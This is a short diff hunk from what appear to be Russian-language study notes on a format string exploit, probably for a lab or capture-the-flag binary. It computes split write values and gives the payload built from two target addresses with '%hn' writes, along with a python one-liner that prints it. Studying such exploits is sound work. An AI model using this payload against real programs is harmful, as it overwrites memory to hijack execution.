@@ -26,6 +26,7 @@ Non-debugging symbols:
 4294957181 слишком много разобьём на два
 0xffffdd21 = dd21 56601(56609 - 8 (8 это адреса написанные вначале)) and ffff 8926(65535 - 56609)
 
+// TODO:: why 10? write step about overflow
 9. Наш payload
 nop "exit addr" + "%56601d" + "%10$hn" + "%8926d" + "%11$hn"
 python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08" + "%56601d" + "%10$hn" + "%8926d" + "%11$hn"'
